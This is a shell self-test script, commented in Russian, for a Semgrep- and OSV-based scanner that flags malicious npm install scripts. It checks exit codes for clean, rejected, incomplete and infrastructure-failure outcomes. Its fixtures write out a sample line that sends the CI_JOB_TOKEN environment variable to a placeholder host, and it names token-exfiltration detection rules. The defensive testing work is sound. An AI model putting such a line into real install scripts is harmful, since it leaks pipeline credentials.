#!/bin/sh
# selftest.sh — прогоняет команды раздела «Как проверить у себя» из README этого каталога
# и сверяет коды возврата и ключевые строки с тем, что README обещает.
#   sh selftest.sh
# Коды: 0 всё сошлось · 1 расхождение README и реальности · 3 инструмент не отработал,
# сверять было не с чем. Команды с пометкой «[живой стенд]» сюда не входят.
set -u

HERE=$(CDPATH= cd "$(dirname "$0")" && pwd)
TMP=$(mktemp -d)
# Каталоги для docker собираются в дереве репозитория: при установке docker из snap
# bind mount из /tmp хоста в контейнер не виден, и /src приезжает пустым.
BIG=$(mktemp -d "$HERE/.selftest-big.XXXXXX")
LOCKED=$(mktemp -d "$HERE/.selftest-locked.XXXXXX")
# Права возвращаются до rm -rf: каталог с правами 000 не удалить, не открыв его.
trap 'chmod -R u+rwx "$LOCKED" 2>/dev/null; rm -rf "$TMP" "$BIG" "$LOCKED"' EXIT
trap 'exit 130' INT
trap 'exit 143' TERM

FAILED=0; INFRA=0; out=''
expect() {  # expect <код> <подстрока> -- <команда…>
  want_rc=$1; want_out=$2; [ "$3" = -- ] || infra "expect: ожидался --"; shift 3
  out=$("$@" 2>&1); rc=$?
  case "$out" in *"$want_out"*) hit=1 ;; *) hit=0 ;; esac
  if [ "$rc" -eq "$want_rc" ] && [ "$hit" -eq 1 ]; then
    printf 'ok     %s\n' "$*"
  elif [ "$rc" -eq 3 ] && [ "$want_rc" -ne 3 ]; then
    INFRA=1; printf 'ИНФРА  %s: инструмент не отработал\n' "$*"; printf '%s\n' "$out" | sed 's/^/       | /'
  else
    FAILED=1; printf 'ПРОВАЛ %s: ждали код %s и «%s», получили код %s\n' "$*" "$want_rc" "$want_out" "$rc"
    printf '%s\n' "$out" | sed 's/^/       | /'
  fi
}
saw()   { case "$out" in *"$1"*) printf 'ok     содержит «%s»\n' "$1" ;; *) FAILED=1; printf 'ПРОВАЛ нет «%s»\n' "$1" ;; esac; }
never() { case "$out" in *"$1"*) FAILED=1; printf 'ПРОВАЛ есть «%s»\n' "$1" ;; *) printf 'ok     нет «%s»\n' "$1" ;; esac; }
infra() { printf 'ИНФРА  %s\n' "$1"; exit 3; }

# Предусловия. Всё, чего не хватает для прогона, — это ИНФРА, а не провал замера.
command -v docker >/dev/null 2>&1 || infra 'docker не найден'
docker info >/dev/null 2>&1 || infra 'демон docker недоступен'
command -v python3 >/dev/null 2>&1 || infra 'python3 не найден: depscan.sh нечем разбирать отчёт'
[ -n "$BIG" ] && [ -n "$LOCKED" ] || infra 'не создаётся временный каталог рядом с selftest.sh'

# Версии берутся из depscan.sh, чтобы selftest не завёл вторую копию пина.
read_pin() { sed -n "s/^$1='\(.*\)'\$/\1/p" "$HERE/depscan.sh"; }
SEMGREP_IMAGE=$(read_pin SEMGREP_IMAGE)
OSV_IMAGE=$(read_pin OSV_IMAGE)
SCAN_FLAGS=$(read_pin SCAN_FLAGS)
[ -n "$SEMGREP_IMAGE" ] && [ -n "$OSV_IMAGE" ] && [ -n "$SCAN_FLAGS" ] ||
  infra 'в depscan.sh не найден пин SEMGREP_IMAGE, OSV_IMAGE или SCAN_FLAGS'
# Тот же набор флагов без --disable-nosem: им проверяется, что флаг несущий.
NOSEM_ON=$(printf '%s\n' "$SCAN_FLAGS" | sed 's/ *--disable-nosem//')
for img in "$SEMGREP_IMAGE" "$OSV_IMAGE"; do
  docker image inspect "$img" >/dev/null 2>&1 && continue
  printf 'тяну образ %s\n' "$img" >&2
  docker pull "$img" >/dev/null 2>&1 || infra "образ не тянется: $img"
done

RULE=/rules/malicious-install-script.yaml
SRC_MAL="$HERE/testdata/malicious"
SRC_BEN="$HERE/testdata/benign"

# Разбор отчёта Semgrep: таблица случаев на фикстурах реального формата.
expect 0 'OK' -- python3 "$HERE/scan_result_test.py"

# Синтаксис скриптов каталога.
expect 0 '' -- sh -n "$HERE/depscan.sh"
expect 0 '' -- sh -n "$HERE/selftest.sh"

# Правило разбирается и содержит оба правила каталога.
expect 0 'found 0 configuration error(s), and 2 rule(s)' -- \
  docker run --rm -v "$HERE:/rules:ro" -v "$SRC_BEN:/src:ro" "$SEMGREP_IMAGE" \
  semgrep scan --metrics=off --validate --config "$RULE" /src

# depscan: вредоносный каталог отклоняется, и вложенная зависимость тоже просканирована.
expect 1 'ОТКЛОНЕНО' -- sh "$HERE/depscan.sh" "$SRC_MAL"
saw 'Targets scanned: 25'
saw 'scan_result: НАХОДКА'

# depscan: легитимный каталог проходит, и у OSV при этом был вход.
expect 0 'ЧИСТО' -- sh "$HERE/depscan.sh" "$SRC_BEN"
saw 'No issues found'

# depscan: проверять было нечего — это отдельный исход, а не «чисто».
expect 4 'НЕЧЕГО ПРОВЕРЯТЬ' -- sh "$HERE/depscan.sh" "$HERE/testdata/no-manifest"
never 'depscan: ЧИСТО'

# depscan: lock-файл есть, но не разобран — вердикта нет.
expect 3 'Error during extraction' -- sh "$HERE/depscan.sh" "$HERE/testdata/broken-lock"

# depscan: демона нет — вердикта нет, и это не «отклонено».
expect 3 'ИНФРА' -- env DOCKER_HOST=tcp://127.0.0.1:1 sh "$HERE/depscan.sh" "$SRC_BEN"
never 'ОТКЛОНЕНО'

# depscan: ошибки вызова.
expect 2 'usage' -- sh "$HERE/depscan.sh"
expect 2 'каталог не найден' -- sh "$HERE/depscan.sh" "$TMP/нет-такого-каталога"

# Правило на легитимном каталоге без фильтра по severity: одна WARNING про сетевой
# вызов (это ожидаемо и код 1), но ни одного ERROR про вынос токена.
expect 1 'install-script-network-beacon' -- \
  docker run --rm -v "$HERE:/rules:ro" -v "$SRC_BEN:/src:ro" "$SEMGREP_IMAGE" \
  semgrep scan --metrics=off --config "$RULE" --error /src
never 'install-script-ci-token-exfil'

# Покрытие по файлам: ERROR должен быть на каждом из шестнадцати вредоносных образцов,
# включая тот, что лежит в node_modules/, и два с меткой подавления.
expect 1 'install-script-ci-token-exfil' -- \
  docker run --rm -v "$HERE:/rules:ro" -v "$SRC_MAL:/src:ro" "$SEMGREP_IMAGE" \
  semgrep scan $SCAN_FLAGS --metrics=off --config "$RULE" --severity ERROR --error /src
expect 0 '25' -- sh -c "docker run --rm -v '$HERE:/rules:ro' -v '$SRC_MAL:/src:ro' '$SEMGREP_IMAGE' \
  semgrep scan $SCAN_FLAGS --metrics=off --config '$RULE' --severity ERROR --error /src \
  2>/dev/null | grep -oE '/src/[^ ]+\.js' | sort -u | wc -l | tr -d ' ' | grep -x 25"

# Тот же прогон без --disable-nosem: два образца выключают правило комментарием из
# собственного кода, и блокируются только четырнадцать. Флаг несущий, не украшение.
expect 0 '23' -- sh -c "docker run --rm -v '$HERE:/rules:ro' -v '$SRC_MAL:/src:ro' '$SEMGREP_IMAGE' \
  semgrep scan $NOSEM_ON --metrics=off --config '$RULE' --severity ERROR --error /src \
  2>/dev/null | grep -oE '/src/[^ ]+\.js' | sort -u | wc -l | tr -d ' ' | grep -x 23"

# Пропуск по размеру: Semgrep не читает файл больше 1 МБ и выходит кодом 0. Утечка в
# конце наполнителя не видна никому — это не «чисто», а отсутствие вердикта.
printf 'console.log("ok");\n' >"$BIG/benign.js"
{ yes '// padding' | head -n 110000
  printf "const https = require('https');\n"
  printf "https.get('https://example.invalid/?token=' + process.env.CI_JOB_TOKEN);\n"
} >"$BIG/install.js"
cp "$SRC_BEN/package-lock.json" "$BIG/package-lock.json"
expect 3 'scan_result: НЕПОЛНО' -- sh "$HERE/depscan.sh" "$BIG"
saw 'exceeded_size_limit'
never 'ЧИСТО'
never 'ОТКЛОНЕНО'

# Недоступный подкаталог: Semgrep в контейнере работает от root и читает его, а обход
# каталога на хосте обрывается — значит, список ожидаемых файлов неполон и вердикта нет.
if [ "$(id -u)" = 0 ]; then
  printf 'ИНФО   закрытый каталог под root не проверить — пропуск\n'
else
  printf 'console.log("ok");\n' >"$LOCKED/benign.js"
  mkdir -p "$LOCKED/locked"
  printf 'console.log("ok");\n' >"$LOCKED/locked/inner.js"
  cp "$SRC_BEN/package-lock.json" "$LOCKED/package-lock.json"
  chmod 000 "$LOCKED/locked"
  expect 3 'scan_result: НЕПОЛНО' -- sh "$HERE/depscan.sh" "$LOCKED"
  saw 'не прочитан'
  never 'ЧИСТО'

  # Тот же каталог с утечкой в закрытом подкаталоге. Образ обычно работает от root и
  # файл дочитывает: находка перекрывает неполноту, приоритет 1 > 3 сохраняется. При
  # rootless docker или user namespaces контейнер закрытый каталог не прочтёт, и
  # честный исход — 3: утечку никто не видел. Ветка выбирается по uid в контейнере.
  chmod 755 "$LOCKED/locked"
  { printf "const https = require('https');\n"
    printf "https.get('https://example.invalid/?token=' + process.env.CI_JOB_TOKEN);\n"
  } >"$LOCKED/locked/inner.js"
  chmod 000 "$LOCKED/locked"
  if [ "$(docker run --rm "$SEMGREP_IMAGE" id -u 2>/dev/null)" = 0 ]; then
    expect 1 'неполно' -- sh "$HERE/depscan.sh" "$LOCKED"
    saw 'ОТКЛОНЕНО'
  else
    printf 'ИНФО   контейнер не от root: закрытый каталог не читается и внутри него\n'
    expect 3 'scan_result: НЕПОЛНО' -- sh "$HERE/depscan.sh" "$LOCKED"
    never 'ОТКЛОНЕНО'
  fi
  chmod 755 "$LOCKED/locked"

  # Закрытый корень проекта: без права входа (000) и без права чтения (111) — это ИНФРА,
  # а не ошибка вызова и не «каталог пуст»: `ls` на таком каталоге молчит.
  chmod 000 "$LOCKED"
  expect 3 'недоступен' -- sh "$HERE/depscan.sh" "$LOCKED"
  never 'НЕЧЕГО ПРОВЕРЯТЬ'
  chmod 111 "$LOCKED"
  expect 3 'недоступен' -- sh "$HERE/depscan.sh" "$LOCKED"
  never 'НЕЧЕГО ПРОВЕРЯТЬ'
  chmod 755 "$LOCKED"
fi

# Профиль расширений задан в scan_result.py. Если образ перестанет брать какое-то из
# шести, охват станет неполным и строка упадёт — дрейф будет виден сразу.
rm -rf "$BIG"; mkdir "$BIG"
for ext in js cjs mjs jsx ts tsx; do printf 'console.log("ok");\n' >"$BIG/a.$ext"; done
cp "$SRC_BEN/package-lock.json" "$BIG/package-lock.json"
expect 0 'ЧИСТО' -- sh "$HERE/depscan.sh" "$BIG"

# Помощник не отработал — вердикта нет. Подменяем python3 в PATH падающей заглушкой:
# на вредоносном каталоге ждать «ОТКЛОНЕНО» нельзя, разбирать отчёт было нечем.
mkdir -p "$TMP/fakepy"
printf '#!/bin/sh\nexit 1\n' >"$TMP/fakepy/python3"
chmod +x "$TMP/fakepy/python3"
expect 3 'ИНФРА' -- env "PATH=$TMP/fakepy:$PATH" sh "$HERE/depscan.sh" "$SRC_MAL"
never 'ОТКЛОНЕНО'

printf '\n'
if [ "$FAILED" -ne 0 ]; then printf 'configs/semgrep: ПРОВАЛ\n'; exit 1; fi
if [ "$INFRA" -ne 0 ]; then printf 'configs/semgrep: ИНФРА\n'; exit 3; fi
printf 'configs/semgrep: ok\n'
exit 0
